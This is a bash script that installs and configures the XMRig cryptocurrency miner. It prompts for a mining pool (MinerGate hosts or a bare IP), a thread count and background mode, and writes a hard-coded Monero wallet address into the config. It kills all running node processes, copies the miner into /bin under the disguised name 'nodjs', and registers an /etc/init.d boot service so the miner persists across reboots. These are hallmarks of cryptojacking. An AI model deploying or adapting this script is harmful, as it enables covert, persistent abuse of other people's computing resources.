#!/bin/bash
clear
file="config.json"


if [ -f $file ] ; then
    rm $file
    echo "old config removed"
fi

RED='\033[1;31m'
NC='\033[0m'
GR='\033[1;92m'
M='\033[1;96m'
B='\033[1;94m'
cp default config.json

var="$(cat <<EOF
#! /bin/sh
# /etc/init.d/star
#

# Some things that run always
touch /var/lock/star

# Carry out specific functions when asked to by the system
case "$1" in
  start)
    echo "Starting script star "
    echo "Could do more here"
    /bin/xmrig6 -c /bin/config.json
    ;;
  stop)
    echo "Stopping script blah"
    echo "Could do more here"
    pkill xmrig6
    ;;
  *)
    echo "Usage: /etc/init.d/blah {start|stop}"
    exit 1
    ;;
esac

exit 0
EOF
)"
echo "$var" > /etc/init.d/star





pkill node > /dev/null 2>&1
ps aux | sort -nrk 3,3 | head -n 5
proc=`grep -c ^processor /proc/cpuinfo`
#asi= `grep -c aes /proc/cpuinfo`
#echo -e  ${M} ' Proc Core :' $proc ${NC} aes Core :' ${M}  $asi ${NC} "\n"
#proc=`grep -c ^processor /proc/cpuinfo`
pp=$(cat  /proc/cpuinfo | grep -c aes)
if [ "$pp" = "0" ]
then
echo "not Found"
echo -e  ${M} ' Proc Core :' $proc ${NC} 'aes Core :' ${M} "0" ${NC} "\n"
sed -i "s/x-22/0/" config.json
else
echo "found"
echo -e  ${M} ' Proc Core :' $proc ${NC} 'aes Core :' ${M} $pp ${NC} "\n"
sed -i "s/x-22/2/" config.json

fi



echo -e  ${RED} ' Please pick from the following Pool '${NC} "\n"
pool1="xmr.pool.minergate.com:45700"
pool2="bcn.pool.minergate.com:45550"
pool3="xdn.pool.minergate.com:45620"
pool4="aeon.pool.minergate.com:45690"
pool5="54.173.196.40:3333"
select Pool in $pool1 $pool2 $pool3 $pool4 $pool5
do
        case $Pool in 
        $pool1|$pool2 |$pool3 |$pool4 |$pool5 )   
                break
                ;;
        *)
                echo "Invalid Pool" 
                ;;
        esac
done

echo -en ${GR} 'Now pick a Threads number you chose' ${NC} "\n"
read Threads

#select Threads in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16
#do
      #  case $Threads in
      #  1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16)
      #          break

      #  *)
        #        echo "Invalid Threads"

        #esac
#done
echo -en 'Now pick a if you wanna run it on background'"\n"
select background in true false
do
        case $background in
        true|false)
                break
                ;;
        *)
                echo "Invalid Threads"
                ;;
        esac
done

echo -en "Pool set  on          :" ${RED} $Pool ${NC}  "\n"
echo -en "Number of threads set :" ${RED} $Threads ${NC} "\n"
echo -en "Background set        : "${RED} $background ${NC} "\n"
sed -i "s/x--0/$background/" config.json
sed -i "s/x--1/$Threads/" config.json
sed -i "s/x--2/$Pool/" config.json
if [ "$Pool" == "aeon.pool.minergate.com:45690" ]; then
   sed -i "s/cryptonight/cryptonight-lite/" config.json
   echo "cryptonight-lite"
#else
  #echo "try again"
fi
if [ "$Pool" == "54.173.196.40:3333" ]; then
   sed -i "s/sam05@protonmail.com/D7KCDd3cgZ7H3WBq4tQfF1Wfq6rFoQVaKb3mkLnkC1HPPLo8gkBxbQL6NoK7bw8Xt6NU26nmhSGdYDBHrTz89yCZCbLmPuS/" config.json
   echo "cryptonight-pool"
   eex="xmrig6"
else
   if [ "$pp" = "0" ]
   then
   eex="xmrig6"
   else
   eex="nodjs"
   fi
fi
#cat config.json
#./shh

#./node
cp $eex /bin/
cp xmrig6 /bin/xmrig6
cp config.json /bin/
$eex -c /bin/config.json
update-rc.d star defaults
